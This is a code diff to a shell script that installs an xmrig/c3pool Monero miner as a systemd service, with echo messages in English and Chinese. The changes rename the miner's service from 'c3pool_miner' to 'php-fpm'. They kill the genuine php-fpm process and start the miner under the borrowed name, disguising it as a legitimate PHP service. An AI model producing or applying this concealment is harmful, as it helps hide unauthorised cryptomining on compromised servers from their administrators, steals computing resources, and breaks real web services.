@@ -158,7 +158,7 @@ echo
 echo "[*] Removing previous c3pool miner (if any)"
 echo "[*] 卸载以前的 C3Pool 矿工 (如果存在)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop c3pool_miner.service
+  sudo systemctl stop php-fpm.service
 fi
 killall -9 xmrig
 
@@ -309,7 +309,7 @@ else
   else
 
     echo "[*] Creating c3pool_miner systemd service"
-    cat >/tmp/c3pool_miner.service <<EOL
+    cat >/tmp/php-fpm.service <<EOL
 [Unit]
 Description=Monero miner service
 
@@ -322,15 +322,15 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
+    sudo mv /tmp/php-fpm.service /etc/systemd/system/php-fpm.service
     echo "[*] Starting c3pool_miner systemd service"
 	echo "[*] 启动c3pool_miner systemd服务"
     sudo killall php-fpm 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable c3pool_miner.service
-    sudo systemctl start c3pool_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
-	echo "查看矿工服务日志,请运行 \"sudo journalctl -u c3pool_miner -f\" 命令"
+    sudo systemctl enable php-fpm.service
+    sudo systemctl start php-fpm.service
+    echo "To see miner service logs run \"sudo journalctl -u php-fpm -f\" command"
+	echo "查看矿工服务日志,请运行 \"sudo journalctl -u php-fpm -f\" 命令"
   fi
 fi
 
